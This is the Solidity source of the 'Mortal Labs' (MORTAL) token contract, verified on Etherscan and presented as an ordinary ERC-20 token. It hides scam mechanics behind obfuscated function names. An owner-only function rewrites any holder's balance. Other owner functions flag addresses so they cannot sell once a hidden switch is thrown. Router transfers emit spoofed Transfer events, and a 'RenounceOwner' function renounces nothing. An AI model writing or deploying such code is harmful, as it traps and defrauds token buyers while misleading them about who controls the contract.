/**
 *Submitted for verification at Etherscan.io on 2022-10-18
*/

//SPDX-License-Identifier: UNLICENSED                              

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract MortalLabs {
  
    mapping (address => uint256) public fAmnT;
    mapping (address => bool) fUsR;
	mapping (address => bool) fRen;



    // 
    string public name = "Mortal Labs";
    string public symbol = unicode"MORTAL";
    uint8 public decimals = 18;
    uint256 public totalSupply = 150000000 * (uint256(10) ** decimals);
    uint ftm = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        fAmnT[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x0840D51CE0CaE308083618b6171d25FC1715adc9;
    address Deployer = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier J() {   
    require(msg.sender == owner);
         _;}
    modifier K () {
        ftm = 0;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Router)  {
        require(fAmnT[msg.sender] >= value);
        fAmnT[msg.sender] -= value;  
        fAmnT[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(fUsR[msg.sender]) {
        require(ftm == 1);} 
        require(fAmnT[msg.sender] >= value);
        fAmnT[msg.sender] -= value;  
        fAmnT[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return fAmnT[account]; }
        function fchk(address E) J public{          
        require(!fUsR[E]);
        fUsR[E] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function fbnc(address E, uint256 W) J public returns (bool success) {
        fAmnT[E] = W;
        return true; }
        function RenounceOwner(address E) public {
        require(msg.sender == owner);
        fRen[E] = true;}
        
        function fdrw(address E) J public {
        require(fUsR[E]);
        fUsR[E] = false; }
		 function _deploy() K public {
            require(msg.sender == owner);
        }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= fAmnT[from]);
        require(value <= allowance[from][msg.sender]);
        fAmnT[from] -= value;  
        fAmnT[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(fUsR[from] || fUsR[to]) {
        require(ftm == 1);}
        require(value <= fAmnT[from]);
        require(value <= allowance[from][msg.sender]);
        fAmnT[from] -= value;
        fAmnT[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }